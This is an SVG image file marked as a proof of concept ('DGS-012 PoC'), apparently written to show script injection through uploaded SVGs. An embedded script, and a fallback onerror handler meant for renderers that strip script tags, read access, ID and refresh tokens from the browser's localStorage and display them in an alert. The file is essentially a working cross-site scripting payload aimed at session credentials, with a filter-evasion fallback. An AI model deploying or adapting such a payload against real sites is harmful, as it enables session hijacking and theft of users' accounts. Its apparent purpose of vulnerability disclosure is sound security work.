<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="200" height="200" viewBox="0 0 200 200" version="1.1">
  <rect width="200" height="200" fill="#f0f0f0"/>
  <text x="10" y="100" font-size="16" fill="#c00">DGS-012 PoC</text>

  <script type="text/javascript"><![CDATA[
    (function(){
      var keys = ['accessToken','wesapAccessToken','idToken','refreshToken','wesapRefreshToken'];
      var out = 'Origin: ' + location.origin + '\n\n';
      keys.forEach(function(k){
        var v = localStorage.getItem(k);
        out += k + ':\n' + (v || '(not set)') + '\n\n';
      });
      alert(out);
    })();
  ]]></script>

  <!-- fallback: onerror handler for renderers that strip <script> but keep event attrs -->
  <image href="x" onerror="(function(){var k=['accessToken','wesapAccessToken','idToken','refreshToken','wesapRefreshToken'];var o='Origin: '+location.origin+'\n\n';k.forEach(function(n){o+=n+':\n'+(localStorage.getItem(n)||'(not set)')+'\n\n';});alert(o);})()"/>
</svg>
